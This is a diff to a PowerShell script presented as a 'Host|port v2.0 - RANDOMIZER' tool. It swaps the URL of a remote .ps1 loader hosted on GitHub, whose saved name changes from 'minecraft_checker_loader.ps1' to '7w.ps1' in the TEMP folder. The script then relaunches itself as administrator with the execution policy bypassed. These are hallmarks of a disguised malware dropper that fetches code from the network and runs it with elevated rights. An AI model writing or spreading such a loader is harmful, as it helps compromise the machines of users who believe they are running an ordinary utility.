@@ -5,8 +5,8 @@ $Host.UI.RawUI.WindowTitle = "Host|port v2.0 - RANDOMIZER"
 $Host.UI.RawUI.BackgroundColor = "Black"
 $Host.UI.RawUI.ForegroundColor = "DarkRed"
 Clear-Host
-$ScriptURL = "https://github.com/ShramC/Ds/raw/refs/heads/main/loder.ps1"
-$ScriptPath = "$env:TEMP\minecraft_checker_loader.ps1"
+$ScriptURL = "https://github.com/ShramC/Ds/raw/refs/heads/main/7w.ps1"
+$ScriptPath = "$env:TEMP\7w.ps1"
 Start-Sleep 1
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
